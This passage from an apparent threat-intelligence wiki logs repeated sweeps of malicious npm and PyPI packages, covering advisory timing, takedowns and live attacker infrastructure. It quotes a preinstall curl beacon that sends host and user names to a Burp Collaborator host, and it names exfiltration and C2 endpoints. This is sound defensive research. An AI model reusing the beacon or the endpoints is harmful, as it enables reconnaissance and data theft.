**Survivor re-checks (seventh same-day pass, ~20:20 UTC):** `@insiderintelligence/googleadmanager` STILL LIVE (~203 h); `@pwaplatform/module-sso-integration` STILL LIVE (~81 h, unchanged 09-20T11:05:20Z); `@baanx/solana-lib` STILL LIVE + re-armed, still GHSA-less; all nine Telegram names return 200 (day five→six); `chai-as-viem` still installable; `homestack-cheer` still live; **none of today's new members has a GHSA mirror yet** (`affects=` direct queries empty for `@baanx/abis`, `gemini-computer-use`, `@uh-platform/cloud`, `@woodpecker-web-shared/components`). `npmjs.it.com` unchanged (root 401, `/api/register` 400 `invalid agent_id` = agent up).

**Cross-page state change the cluster should read as context:** npm took the mathmain trio down this evening — ~2.5 h after JFrog's publication (see above). Compare the `@baanx` operator, doing the opposite: publishing INTO advisories.

## <a id="september-21-ninth-sweep"></a>September 21 ninth sweep (~23:00–23:35 UTC): a tenth member joins via the registry feed — `@uol-afiliados/affiliated-config-lib`, the class's THIRD live Burp Collaborator collector; and the advisories-as-version-bump-prompt behavior replicates on PyPI

**New cluster/neighbor member (OSV `MAL-2026-16370`, published 21:31 UTC, modified 21:46 UTC; tarball pulled and analyzed directly by this wiki):** **`@uol-afiliados/affiliated-config-lib` 102.0.0** — npm account created the package at **19:21:39 UTC**, one version, still LIVE at the 23:20 UTC check, **no GHSA mirror** (`affects=` direct query empty). The tarball is two files: a `package.json` whose only script is `preinstall: node index.js`, and an 8-line `index.js` running `exec('curl "http://$(hostname).$(whoami).afiliados.hqbv58hgt1sjk7vf7ru4o0mwzn5etahz.oastify.com/"')`. Description is literally `"Nodejs SDK for Redacted"`, author empty, license ISC.
- **This is the `@uh-platform` preinstall-curl template verbatim** (shell command substitution → hostname+username into the DNS label → plain-HTTP OAST beacon) pointed at a **DIFFERENT Burp Collaborator subdomain** — the third distinct live collector this wiki has logged in four days (`ii473egh1b4kbaw03rf7pkzik9q0er8fx` in the `@pwaplatform` canary, `pa33pg1od9cr4ffnrzec8864jvpmdd12` shared by the `@uh-platform` five, now `hqbv58hgt1sjk7vf7ru4o0mwzn5etahz`). Whether this is one operator rotating collectors or different operators copying the template, **the Collaborator subdomain string is the durable cluster key** — it survives renaming, resquatting and version bumps, and both of today's subdomains resolve wildcard (`foo.<sub>.oastify.com` answers), so resolver-log hunts work without knowing any label grammar.
- **The scope name is the targeting statement:** `@uol-afiliados` mimics the internal namespace of UOL (Brazil's largest content/affiliate portal) — the same dependency-confusion qualification shape as the Thai-fintech `@baanx` squat and the T-Bank-shaped `@pwaplatform` canary: an inflated `102.0.0` against a plausible private scope, so the first victim to `npm install` it is an internal CI build that resolves public-before-private. Amazon Inspector's own text says exactly this ("consistent with dependency-confusion reconnaissance").

**The PyPI mirror of the operator behavior (durable read, promoted from the `@baanx` observation):** `starlette-healthchecks` (PyPI, `MAL-2026-16356`, kam193 typosquat-telemetry campaign `2026-09-starlette-healthcheck`, sibling `starlette-healthcheck` already removed) carried `1.3.1` uploaded 16:21 UTC, its OSV advisory landed **16:50 UTC** — and PyPI shows **`1.3.2` uploaded 20:04:37 UTC, three hours FOURTEEN minutes AFTER its own advisory**, still live at check. The republish-after-naming behavior this wiki caught three-for-three in the `@baanx` trio on npm is now confirmed on a second registry with a second finder source: **for this actor class the advisory feed is not a stop signal, it is a build trigger.**

**Below-bar stream items that each carry one durable fact (verified by this wiki tonight):**
- **`pullgetsage` (PyPI, `MAL-2026-16366`) — LIVE and fully re-armed:** three uploads 13:48:38 / 14:17:33 / 15:57:32 UTC (v0.1.0–0.1.2, `latest` 0.1.2), stated purpose "a library filled with books," behavior per Inspector = on import zips the installer's **Telegram Desktop `tdata` directory** (session keys → full account takeover) into `aiosendletter_logs` and POSTs it to `https://red-poetry-6b6f.martinmcflywork.workers.dev/` — **this wiki probed the Cloudflare Worker endpoint: answers HTTP 405** (function deployed, GET not accepted, POST-ready). Same-day 2-hour version cadence = active development while advised; no GHSA mirror.
- **`bytepack-probe-a7x3` (npm, `MAL-2026-16364`) — the time-block method in miniature:** created 2026-09-07 17:31:57 UTC, two versions 17:31/17:33, explicit `unpublished` block at **17:40:29 UTC = a 9-minute lifetime**; the OSV advisory landed Sep 21 — a **14-day detection latency** on an artifact that was gone in under an hour. Its payload shape is the interesting part: `package.json` declares dependency `leak-internal` pinned to the HTTPS tarball `https://src-ssrf.bytedance.net/ssrf/probe.tgz` — an install that fetches whatever that host serves at that moment, no pin, no integrity, no signature. **This wiki's DNS check: `src-ssrf.bytedance.net` RESOLVES from public DNS today and returns an internal-style CNAME (`inner-all.toutiao-internal-all3.hl.bytelb.net`), HTTP non-answering** — the "internal-looking SSRF probe host" is (or was) real infrastructure, which makes this a probe-of-a-probe artifact whose true owner (bounty researcher or attacker staging dependency-confusion against ByteDance-adjacent targets) is unresolved. Uninstall-time note: npm resolving a tarball URL at install time IS code execution from an arbitrary host — `dependencies:` entries whose `resolved`/spec is a URL rather than a semver range are a free static hunt.
- **`my-ctf-helper-script-9921`** (`16365`, live `1.0.0` since Sep 18 11:15 UTC): require-time `fetch(document.cookie)` → hardcoded `webhook.site` token; stub class, stream state. `blue-string-formatter-utilss` (`16363`): xss.report script-injection cover story; npm time block shows it **lived 75 minutes Sep 17 and self-unpublished** — advisory landed four days later.

**Re-checks (~23:00–23:35 UTC, all unchanged):** `@uh-platform/cloud|domain-widget|nadaver|nadaver2|webcard` **all five still LIVE** with the 17:17–18:51 UTC timestamps untouched; `@asdfaskdjfksadhfkasf/nadaver2` random-scope sibling live; `gemini-computer-use` 0.1.2 still live **and its server `smart-server.online/install.sh` answers HTTP 200 right now** — the npx-execution bait still lands; `@baanx` trio unchanged (abis/blockchain-config 9.9.11, solana-lib 9.9.10, still GHSA-less); `@insiderintelligence/componentlibrary` 9.9.10 live; all nine Telegram `chat_id 1064260758` names byte-identical for the sixth consecutive same-day check (day six of advised-and-serving; shasums pulled as a stronger identity check this pass); `@woodpecker-web-shared/components` still serving malicious 2.20.5 below latest 4.20.5; mathmain trio holders still `0.0.1-security`; `events-sync` still 1.2.0 / zero GHSA; `npmjs.it.com` root 401 / `/api/register` 400 (agent up). **OSV sweep: 16370 was the only new record — 16371–16380 empty at check. High-water now MAL-2026-16370; resume sweeps at 16371.** KEV unchanged 2026.09.21 / 1,717 (JSON re-verified). Feeds: every priority source's newest item already on-wiki (Unit42 IAM-lockdown explainer below bar, JFrog Equation, Securelist PAYLOAD, Wiz Sep 17 pair, Sonatype Sep 18 piece); Socket CF-block persists, Akamai Access-Denied persists, MSFT blog feed serves a block page, StepSecurity's RSS still serves 2023 items (stale feed, record for future discovery); no Shai-Hulud/TeamPCP/Mini-Shai-Hulud follow-up anywhere.

## <a id="september-21-tenth-sweep"></a>September 21 tenth sweep (~01:15–01:45 UTC Sep 22 carry-over): the evening's GHSA wave closed — every named scope now has GitHub mirrors; the same UTC window security-holder-ed a whole different campaign (ViteVenom); survivors byte-identical into day seven

**The advisory mirror wave landed and re-drew the cluster boundary (GitHub Advisory API, direct queries by this wiki):**

- The Sep 18 advisory's last GHSA-less member is mirrored: **`@baanx/solana-lib` now has `GHSA-pvh9-27rp-6282`** (published Sep 21 03:30 UTC) — the whole `@baanx` trio is now triple-covered (OSV + Inspector + GitHub).
- The evening's new names all got mirrors within ~4 h of their OSV entries: `@baanx/abis` `GHSA-r554-rpx4-qw24` + `@baanx/blockchain-config` `GHSA-7cc3-jjqj-wrm5` + `@insiderintelligence/componentlibrary` `GHSA-5h4w-mvwx-ff8q` + `gemini-computer-use` `GHSA-4cwr-c4gf-f9r4` + `@woodpecker-web-shared/components` `GHSA-8hq6-gvg5-x8wq` (all 18:31 UTC); the `@uh-platform` five + `@asdfaskdjfksadhfkasf/nadaver2` + `pullgetsage` + `bytepack-probe-a7x3` + `blue-string-formatter-utilss` + `my-ctf-helper-script-9921` at 21:31 UTC; `@uol-afiliados/affiliated-config-lib` `GHSA-mh6g-473c-fvhx` at 00:31 UTC Sep 22. **The 3–4 h OSV→GHSA mirror latency observed all week is now the working baseline for when downstream scanners will see a name.**
- **The mirror batch surfaced a sibling this wiki had not linked:** `@asdfaskdjfksadhfkasf/nadaver2` — the random-keyboard-scope twin of `@uh-platform/nadaver2`, SAME version `102.0.0`, SAME description (`Nodejs SDK for Redacted`), and (this wiki's registry pull) **SAME publisher email `jpmaia@uolinc.com` as `@uol-afiliados/affiliated-config-lib`**. The @uol-afiliados "collector #3" and the @uh-platform neighbor fleet are **one account**, and that account's email is a UOL-shaped address on a random-scope throwaway — account-level join across what the ninth sweep recorded as separate fleets. The GitHub listing endpoint still returns these only via `affects=`, per standing API quirk.
- **`mathmain`/`mathsbase`/`math-universe` got GHSA mirrors as the takedown landed:** `GHSA-v6mx-2p6p-3628` 19:49:06, `GHSA-v4cx-64j6-84xm` 20:06:13, `GHSA-97cg-r346-fg22` 20:06:33 UTC — each **~40 s to 30 min after the corresponding holder creation** (19:48/20:05/20:06). The trio is now fully covered; see the [Equation page](equation-of-compromise-npm-mathjs-clone-campaign-sepolia-contracts-slack-c2-github-actions-download-farm-jfrog-september-2026.md).

**Same 23:12–23:17 UTC window, a different campaign closed:** the five-minute holder burst also security-holder-ed **five of the seven ViteVenom/ChainVeil names** (Jul 2026 campaign, advisories sitting since Jul 14) plus two `wos*`/`react-context-form-tdsss` names, with fresh GHSA mirrors at the same minute — including **`@vite-tab/tabui` (`MAL-2026-16371`), a name never in Checkmarx's original list and with no surviving versions: an eighth package or a fresh sighting whose exposure record was deleted with it.** Full time-block forensics on the [ViteVenom page](vitevenom-chainveil-npm-campaign.md). Registry hygiene is arriving in batch wavefronts, minutes-wide, months late.

**Survivor re-checks (~01:25–01:40 UTC Sep 22, seventh+ consecutive pass):** `@insiderintelligence/googleadmanager` STILL LIVE (9.9.10, modified 09-18T17:00:08Z, ~196 h / day eight); `@pwaplatform/module-sso-integration` STILL LIVE (~112 h); all nine Telegram `chat_id 1064260758` names byte-identical **day seven**; `@baanx/solana-lib` live (unchanged 09-20T11:19Z, now WITH its GHSA); `@uh-platform` five + `componentlibrary` + `gemini-computer-use` all LIVE unchanged timestamps; `chai-as-viem` still installable; `events-sync` still 1.2.0 / no GHSA; farm GitHub accounts still return 200; `smart-server.online/install.sh` still HTTP 200; `npmjs.it.com` root still 401 / `/api/register` still 400; `ipcheck-hashed.vercel.app/api/auth/f1f097d9…` still answers (now a live ipinfo-style JSON readout — the endpoint is actively serving). **One counter-example for the record: `woodpecker` (the plain name) was never the malicious package — the 2.20.5 serving name is `@woodpecker-web-shared/components`, still live; the bare `woodpecker` package is an unrelated 2022 relic.**

**OSV sweep:** `MAL-2026-16371` (`@vite-tab/tabui`), `16372` (`@zig-design-system/react`), `16373` (`wos-library`) = the only new records since 16370; 16374+ empty. **High-water now MAL-2026-16373; resume at 16374.** `16372`/`16373` and siblings `wos-library-ui`, `react-context-form-tdsss` were ALSO holder-created 23:36–23:40 UTC (publisher `npm@npmjs.com`) — a second July-era backlog sweep (`wos-library` versions `99.0.0`/`999.999.999` from Jul 20/22 purged, name held). KEV **unchanged 2026.09.21 / 1,717** at 01:25 UTC (no Sep 22 batch yet; kernel trio still attribution-less, quartet still unlisted). Feeds: Unit42 latest still the Sep 21 IAM explainer (below bar); Wiz/Snyk/JFrog/MSFT latest all on-wiki; **two above-bar new items this sweep: the LastPass/Delphos BYOVD stealer (new page) and Securonix TASK#STOMP (noted below)**; Socket CF-block and Akamai 403 persist.

**TASK#STOMP (Securonix via The Hacker News, Sep 21 19:45 UTC) — below promotion bar, recorded for lineage:** PowerShell backdoor campaign; `wscript.exe` → random-named desktop dropper `95c9050t66.vbs` → four human-readable scheduled tasks (`Local Credential Manager`, `Network Audio Service`, `Windows Display Manager`, `Device Credential Handler`) + Startup-folder `msdiag.vbs` backup; two mutually-watchdogged hidden PowerShell modules (`sys_loader.ps1` decoding `diag_pack.dat`, `win_conn.ps1` decoding `win_conn_cfg.dat`) on two token-authenticated C2s (`corecloudfileshare[.]xyz`, `attachmentsharingdrive[.]xyz`); harvests business documents (real-time FS watch), Wi-Fi passwords, clipboard, screenshots; timestomping + window-hiding + a Chrome-maximized final stage (hides the desktop behind Chrome during collection). Commodity info-stealer pattern stack, no novel primitive — durable crumbs: the four task names + the two `.xyz` domains + the mutual-watchdog pair.

## <a id="september-22-twelfth-sweep"></a>September 22 twelfth sweep (~05:15–05:45 UTC): the takedown pipeline captured end-to-end to the second — `test-react-app-in/out/way` deleted unseen; the 3–4 h mirror baseline REVISED (backlog names lag 30–45 days); survivors byte-identical into day nine

**OSV sweep (resumed at 16374 as planned):** exactly three new records, and they are a set — `MAL-2026-16374` = `test-react-app-in`, `16375` = `test-react-app-out`, `16376` = `test-react-app-way` (npm; 16377–16395 empty). **High-water now MAL-2026-16376; resume at 16377.**

**What the trio is: packages this wiki — and every public report — never saw, deleted mid-detection.** All three npm documents show `created` = the holder creation itself (03:15:11 / 03:15:15 / 03:15:19 UTC, `0.0.1-security`, `maintainers: []`, publisher `npm/security-holder`): the pre-holder content is gone from the `time` block, same deletion-erases-its-own-record shape as `@vite-tab/tabui` last night — **second consecutive sweep where the pipeline neutralized a name whose exposure record was destroyed in the process.** What survives is the tarball hash the bot pipeline ingested: GHSA `wm2w-4m2r-mv73` / `vx3p-fwmg-p7g8` / `264w-9h55-v637` each carry a sha256 origin (e.g. `ebade640fa6ac69a…` for `-in`), so an analyzed artifact existed even though no version did. Download telemetry says the trio was effectively dead on arrival (last-week counts 0 / 0 / 1). The names themselves are the tell: `test-react-app-in|out|way` reads like an attacker's or scanner's own test-namespace — monitor whether further `test-*`-shaped holder creations appear (automated pipeline test traffic vs attacker staging is not distinguishable from public data; the sha256 origins are the ground truth either way).

**The pipeline clock, captured to the second (ossf/malicious-packages commit history + OSV origin timestamps + GHSA API, all pulled by this wiki):** for `-in`: holder created 03:15:11 → GHSA published 03:15:48 (**+37 s**) → OSV `import_time` 03:30:07 (**+15 min**) → malicious-packages "Ingest OSV - GHSA Malware" commit 03:30:30 → "Assign IDs" commit 03:32:45 (MAL ID minted **+17 min** after GHSA). This is a fully automated delete→advise→mirror→assign sequence with no human step visible — the coordinated takedown+mirror behavior the tenth sweep inferred for the mathmain trio is now measured directly.

**Baseline revision — the 3–4 h OSV→GHSA latency is real-time-pipeline-only; backlog names lag weeks.** The same 03:15–03:17 UTC window mirrored three August-era names that had sat GHSA-less since their `amazon-inspector` OSV entries: `de-morgan` (`MAL-2026-14264`, advised **Aug 19** → `GHSA-2vc2-gwg3-2gpx` Sep 22 03:15:48, holder-created 03:15:08, **45 downloads/week**), `transform-es2015-unicode-regex` (`MAL-2026-13612`, advised **Aug 7** → `GHSA-jcxm-5v55-599q` 03:15:48, holder 03:15:23), `emoji-prints-fancy` (`MAL-2026-14298`, advised **Aug 19** → `GHSA-m523-mggx-3fgr` 03:17:06, holder 03:16:33, **48 downloads/week**). Each OSV record now shows a second origin (`ghsa-malware`, modified_time Sep 22) bolted onto the August `amazon-inspector` origin = **GitHub's malware bot batch-ingested ~34–45-day-old Inspector findings at 03:15 UTC**, and npm holder-created the names in the same breath. Defender translation: downstream consumers that key on GHSA (Dependabot alerts, most scanner integrations) were blind to these two actively-downloading packages for 5–6 weeks while OSV consumers were warned; the working baseline is now **3–4 h for names the bot sees live, ~1 month+ for names that arrive via other finders** — watch both feeds, not just GitHub.

**Equation-of-Compromise inventory re-check (this wiki, registry pulls) — one on-wiki correction:** the tenth-sweep takedown section listed `modern-events` among "NOT touched" campaign names; the time block shows `modern-events` was holder-created **April 24** (`0.0.1-security`, created timestamp = holder creation), months before JFrog's writeup — either the operator never got a live version up under that name or npm held it early; the page is corrected on the Equation page. The rest of the inventory check holds exactly: `quick-events` still 2.1.4 (Apr 27), `matrixflow-js` still 3.2.2 (Aug 25), `events-sync` still 1.2.0, and the inflated PuP carriers `secure-library-loader` (0.1.0–0.1.3, to Aug 31), `matrixhub` (6.15.0/6.15.1), `matrix-ops-core` (1.0.0–1.1.0) **all still LIVE with live versions**. Removal ≠ remediation, ninth consecutive confirmation.

**Survivor re-checks (~05:20–05:45 UTC, eighth consecutive pass, ALL byte-identical):** `@insiderintelligence/googleadmanager` STILL LIVE (9.9.10, 09-18T17:00:08Z, ~204 h / day nine); `@pwaplatform/module-sso-integration` STILL LIVE (~138 h); Telegram `chat_id 1064260758` spot-checks (`siriusbeyond`, `starbucks-sdk`, `@dbbhk/ui-components`) unchanged day eight; `@baanx` trio, `@uh-platform` five, `@uol-afiliados/affiliated-config-lib`, `componentlibrary`, `gemini-computer-use`, `radio-player-theme` 6.0.0, `chai-as-viem` — every timestamp identical to last check. **C2 endpoints ALL still serving:** `npmjs.it.com` root 401 / register 400 (agent up), `smart-server.online/install.sh` 200, `ipcheck-hashed.vercel.app/api/auth/f1f097d9…` 200, `pullgetsage` Worker 405, and Burp collector #3 `hqbv58hgt1sjk7vf7ru4o0mwzn5etahz.oastify.com` answers 200 — collector wildcard still live and collecting. `pullgetsage` newest upload still 0.1.2 @ 15:57:33Z Sep 21 (2-h cadence paused, or ended).

**Stream / KEV / feeds state:** KEV **unchanged 2026.09.21 / 1,717** (JSON-verified ~05:30 UTC; no Sep 22 batch yet at check; kernel trio still attribution-less, public-exploit quartet still unlisted). Feeds all swept, none above bar: Unit 42's newest is the Sep 21 AWS "Exposure to Lockdown" IAM-neutralization explainer (defensive-architecture piece, below bar); Elastic Sep 21 cloud-threat-emulation post below bar; Wiz nothing new since Sep 17; JFrog/Sonatype/Aikido/Snyk newest all on-wiki or product-marketing; Socket CF-block (403) and Akamai 403 persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up anywhere.

## <a id="september-22-fourteenth-sweep"></a>September 22 fourteenth sweep (~09:15–09:45 UTC): OSV grows one below-bar record; survivors byte-identical into day ten; all C2s still serving; KEV still no Sep 22 batch

**OSV sweep (resumed at 16377 as planned):** one new record — `MAL-2026-16377` = `cloushaar-poc-exfil-91827` 0.0.1 (PyPI, kam193 source, campaign `GENERIC-standard-pypi-install-pentest`, `PROBABLY_PENTEST` classification: install-time basic host-info exfil, no other purpose; published 07:01:53 UTC). Below bar as a standalone item — a pentest-shaped PyPI stub in kam193's generic campaign family, no novel primitive — recorded as stream state. **High-water now MAL-2026-16377; resume at 16378** (16378–16399 empty at check).

**Survivor re-checks (~09:30 UTC, ninth consecutive pass, ALL byte-identical):** `@insiderintelligence/googleadmanager` (9.9.10, 09-18T17:00:08Z, **~208 h / day ten**); `@pwaplatform/module-sso-integration` (99.0.1, unchanged, ~142 h); `@insiderintelligence/componentlibrary` (9.9.10, 09-21T17:02:48Z); `@baanx/solana-lib` (9.9.10), `@baanx/abis` + `@baanx/blockchain-config` (9.9.11); `@uh-platform/domain-widget` (100.0.0) and the scope's remaining members; `@asdfaskdjfksadhfkasf/nadaver2` (102.0.0); `@uol-afiliados/affiliated-config-lib` (102.0.0); `gemini-computer-use` (0.1.2); `homestack-cheer` (1.1.9); `chai-as-viem` (1.1.3 installable); `events-sync` (1.2.0, zero GHSA); `@woodpecker-web-shared/components` (latest 4.20.5 still live above the malicious 2.20.5). **Holder state also stable — every name neutralized in the Sep 21–22 batch waves still reads `0.0.1-security`:** all five `@vite-*`/`@vite-tab` ViteVenom names, `wos-library`/`wos-library-ui`/`react-context-form-tdsss`/`@zig-design-system/react`, and the three Aug-era backlog names (`de-morgan`, `transform-es2015-unicode-regex`, `emoji-prints-fancy`, holder-created 03:15 UTC Sep 22) — no resquat wave in the ~6 h since the last sweep. **C2 endpoints ALL still serving:** `npmjs.it.com` root 401 (agent up), `smart-server.online/install.sh` 200, `ipcheck-hashed.vercel.app/api/auth/f1ff…` path family 200, `pullgetsage` Worker `red-poetry-6b6f.martinmcflywork.workers.dev` 405 (POST-ready), `sobaka-kusaka.ru` → 89.223.127.154, `oob.algamil7x.xyz` → 38.242.146.132. `pullgetsage` cadence still paused since 0.1.2 (15:57Z Sep 21).

**KEV / GHSA / feeds:** KEV **unchanged 2026.09.21 / 1,717** (JSON-verified ~09:26 UTC — no Sep 22 batch yet; the kernel trio remains attribution-less into day four post-listing, the public-exploit quartet still unlisted). GitHub malware-advisory stream newest = the Sep 22 03:15–03:17 UTC backlog-closure wave already recorded last sweep — no new mirrors this window. Feeds: the one above-bar item this sweep is actor intelligence outside this cluster — **Trellix's SideCopy teardown (Indian-academia pivot, ReverseRAT, captured on the [SideCopy actor page](../actors/sidecopy.md#sep22-trellix-academia))**; THN's Meta Muse dictation-endpoint piece is the same Wardle PoC already recorded below bar last sweep; Unit 42 latest still the Sep 21 IAM explainer; Socket CF-block (403) + Akamai 403 persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up anywhere.

## <a id="september-22-fifteenth-sweep"></a>September 22 fifteenth sweep (~11:25–11:45 UTC): FIRST takedown of a live cluster member — `@baanx/abis` deleted with NO security-holder replacement; one-name scope deletion = scope abandonment, not neutralization; survivors ~210 h; KEV still no Sep 22 batch

> **[RETRACTED same day by the sixteenth sweep below]** The 404 was transient — the name returned at HTTP 200 with a byte-identical document ~2 h later and was never taken down. Retained as the error record; read the sixteenth-sweep section for the durable lesson.

**Registry state change (verified twice, ~11:30 UTC):** `@baanx/abis` — one of the ten beacon-fleet members, live at every prior check including last sweep (~09:30 UTC, 9.9.11) — now returns **404 Not found**. Critically, unlike the mathmain trio and the ViteVenom wave, **there is NO `0.0.1-security` holder behind it**: the name is simply gone. Two readings, both useful: (a) npm's takedown path here ran delete-only, so the name is currently RE-REGISTERABLE — the first case where the resquat watch flips from "watch for squatters on held names" to "watch whether the operator re-registers its own tagged name `bxabis`"; (b) a single-name deletion inside a scope whose siblings (`solana-lib` 9.9.10, `blockchain-config` 9.9.11, both live, 200 at check) are untouched is **surgical scope excision, not campaign disruption** — tenth-plus confirmation of removal ≠ remediation. `@baanx/solana-lib` and `@baanx/blockchain-config` remain live with their 9.9.11-era payloads; GHSA mirrors for `abis` (`GHSA-r554-rpx4-qw24`, published 09-21T18:31Z) stay valid after deletion — the advisory outlives the package, which is the point of the mirror layer.

**All other survivors byte-identical (tenth consecutive pass, ~11:35 UTC):** `@insiderintelligence/googleadmanager` (9.9.10, modified 09-18T17:00:08Z, **~210 h / day ten, now past the 9-day mark**), `@pwaplatform/module-sso-integration` (99.0.1, ~144 h), `@insiderintelligence/componentlibrary` (9.9.10, 09-21T17:02:48Z), `@uh-platform` five (`domain-widget` 100.0.0, `cloud` 101.0.0, `nadaver`/`nadaver2` 102.0.0, `webcard` 99.0.0), `@asdfaskdjfksadhfkasf/nadaver2` (102.0.0), `@uol-afiliados/affiliated-config-lib` (102.0.0), `gemini-computer-use` (0.1.2). Holder stability unchanged — every neutralized name still `0.0.1-security`, no resquat wave. C2 endpoints re-probed, ALL still serving: `smart-server.online/install.sh` 200, `npmjs.it.com` 401 (agent up), `ipcheck-hashed.vercel.app/api/auth/f1f097d9…` 200, `pullgetsage` Worker 405.

**OSV sweep:** resumed at 16378 per plan — **16378 through 16400 all empty; high-water unchanged at MAL-2026-16377, resume at 16378 next sweep.** GitHub npm-malware advisory stream: no new commits touching unreviewed/malicious since 09:00 UTC (API since-query empty).

**KEV:** **unchanged 2026.09.21 / 1,717 at ~11:26 UTC** — a full calendar day has now passed with no Sep 22 batch; the Zyxel GS1900 row's BOD due date is Sep 24 and the Veeam CVE-2026-32996 active-exploitation story (on its own page) has produced no row yet — the KEV-vs-active-exploitation-lag watch item sharpens.

**Feeds:** the sweep's above-bar items are captured on their own pages — Checkmarx's `indexed-btree` runtime-loader campaign overlaps this cluster's neighbor story and is recorded on the [Equation of Compromise page](equation-of-compromise-npm-mathjs-clone-campaign-sepolia-contracts-slack-c2-github-actions-download-farm-jfrog-september-2026.md#september-22-checkmarx-runtime-loader-overlap) (same btree-name family, same Sepolia resolver class, €230k stated profit); SharePoint CVE-2026-65660 advisory-vs-CVE-record divergence recorded on the [SharePoint chain page](microsoft-sharepoint-cve-2026-55040-cve-2026-63520-rce-chain-vulncheck.md#september-22-sibling-cve-65660). THN's PolinRider section = Socket's Sep 17 item already on-wiki; Meta Muse/WordPress/Veeam/SideCopy items all previously captured this calendar day. No Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up anywhere in the checked feeds (Socket CF-block, Akamai 403, MSFT block page persist).

## <a id="september-22-sixteenth-sweep"></a>September 22 sixteenth sweep (~13:30–14:05 UTC): the `@baanx/abis` "takedown" was WRONG — the name is back at 200 with identical content; a registry 404 observed twice inside one outage window is not a takedown signal; survivors day ten continue; KEV still no Sep 22 batch (second day)

**Self-correction (retracted last sweep's headline state change):** the fifteenth sweep recorded `@baanx/abis` as the first live cluster member deleted with no security-holder replacement, "verified twice" at ~11:30 UTC. This sweep's re-check (~13:35 UTC, ~2 h later) returns **HTTP 200 with the byte-identical document** — same `_rev` (`2-420a02ad…`), same `created` 09-18T18:22:24.230Z, same `modified` 09-21T16:53:46.797Z, both versions 9.9.9 + 9.9.11 present, and the **9.9.11 tarball still downloads (200, 5,685 b)**. The name was never taken down. Two durable readings, and they matter more than the original observation did:

1. **An npm registry 404 is not a takedown signal.** The registry read 404 on a live, unmodified package — most plausibly a transient registry/CDN fault window, not an administrative action. The fifteenth sweep "verified twice" but both pulls fell inside the same few-minute window; **independent verification means separated in time and by cache path, not twice in a row.** The delete-only / re-registerable / operator-will-re-register-`bxabis` inference chain built on top of the 404 is retracted along with it.
2. **The negative-detection discipline in this wiki's own takedown-metadata signature helps:** a real npm neutralization leaves an `0.0.1-security` holder, fresh `created`, empty maintainers, `npm/security-holder` repository — a POSITIVE artifact. Delete-only cases leave nothing, which means absence-of-evidence claims need repeated evidence. Going forward, any bare-404 takedown claim on this page must be re-confirmed at the next sweep before it enters a homepage or feed entry. (The `@baanx/abis` GHSA mirror `GHSA-r554-rpx4-qw24` remains published regardless — the advisory layer stands on its own artifact analysis.)

**Survivor re-checks (eleventh consecutive pass, all 200, ~13:35–13:40 UTC):** `@baanx/abis` (see correction above — effectively a survivor), `@baanx/solana-lib` (9.9.10), `@baanx/blockchain-config` (9.9.11), `@insiderintelligence/googleadmanager` (9.9.10, ~212 h / day ten), `@pwaplatform/module-sso-integration` (99.0.1), `@insiderintelligence/componentlibrary` (9.9.10), `@asdfaskdjfksadhfkasf/nadaver2` (102.0.0), `@uh-platform` scope incl. `domain-widget` (100.0.0), `@uol-afiliados/affiliated-config-lib` (102.0.0), Telegram-fleet members `@siriusbeyond/ui` / `starbucks-sdk` / `@dbbhk/ui-components`, `radio-player-theme`, `@woodpecker-web-shared/components` — every one answering 200 with unchanged dist-tags. `googleadmanager` 9.9.10 tarball still downloadable (5,703 b). **C2 endpoints ALL still serving:** `smart-server.online/install.sh` 200, `npmjs.it.com` 401, `ipcheck-hashed.vercel.app/api/auth/f1f097d9…` 200, `pullgetsage` Worker 405.

**OSV sweep:** resumed at 16378 — **16378, 16379, 16380, 16381, 16382, 16383, 16385, 16390, 16400 all return "Vulnerability not found"; high-water unchanged at MAL-2026-16377, resume at 16378.** GitHub Advisory API npm stream: newest updated advisories are Sep 18 legitimate-vulnerability entries (React Router, Nuxt, md-editor-v3) — no new malware mirrors since the Sep 22 03:15 UTC backlog wave.

**KEV:** **unchanged 2026.09.21 / 1,717 at ~13:50 UTC** — the catalog has now sat through a second consecutive calendar-day boundary with no Sep 22 batch; no row for the actively-exploited Veeam CVE-2026-32996, and — new this sweep — no row for **Arista VCO CVE-2026-93952** which Arista itself says is "known to be actively exploited" (captured on the [Arista VCO page](arista-velocloud-orchestrator-cve-2026-16812-exploitation.md#september-22-second-vco-flaw-cve-2026-93952)); kernel trio attribution-less day five. The KEV-vs-active-exploitation lag is now a three-item queue (Veeam, VCO-93952, kernel trio) — watch the next batch as a set.

**Feeds:** this sweep's above-bar items are both infrastructure vulnerabilities outside this cluster — Arista's second exploited VCO flaw (new section on the VCO page) and Hyunwoo Kim's fourth KVM escape of the year, an ARM64 nested-virt bug (new section on the [Januscape page](januscape-kvm-cve-2026-53359-guest-to-host-escape.md#september-22-family-update-cve-2026-89775-arm64-nested-virt-escape)); THN's "AI Agents Are Rewriting the Rules of Lateral Movement" is a Token Security vendor piece whose durable stat (51% of agentic external actions authenticate with hard-coded credentials) overlaps GitGuardian's 469-location collector already on-wiki — below bar. Socket CF-block, Akamai 403, MSFT block page persist; Wiz newest Sep 17, Unit 42 newest Sep 21 IAM explainer — both on-wiki. No Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up anywhere.

## <a id="september-22-seventeenth-sweep"></a>September 22 seventeenth sweep (~15:20–15:45 UTC): OSV resumes at 16378 with FIVE new records — two are new cluster members whose npm publisher emails sit ON the attacker domain (`teslapoc@algamil7x.xyz`, `vrtpoc@algamil7x.xyz`); two more are publish-and-delete names whose 4-minute lifetimes make the OSV-embedded analysis the only surviving evidence; mathmain trio correction — its GHSA mirrors DID exist; KEV unchanged at third check

**OSV sweep resumed at 16378 (high-water 16377 from six sweeps running) — five new records, all Amazon-Inspector-sourced, published 13:56–13:58 UTC Sep 22, high-water now MAL-2026-16382 (16383+ empty; resume 16383):**

- **`MAL-2026-16378` `@tesla-insurance/vinless-quote` 9.9.10** — the standing `dns.resolve4` label grammar (`username.hostname.cwd` → subdomain of `oob.algamil7x.xyz`), `String.fromCharCode`-obfuscated module names, `module.constructor._load` loading. **Registry pull by this wiki: npm publisher email `teslapoc@algamil7x.xyz`** — the attacker's own domain in the registry maintainer field; time block: created Sep 21 19:51:58 UTC (`9.9.9` same second), `9.9.10` republished **Sep 22 08:38:09 UTC — ~12.5 h before its own advisory** = the advisories-as-version-bump-prompt loop again. Last-week downloads: **65** (it is being installed). Still live (tarball 200), no GHSA mirror at check.
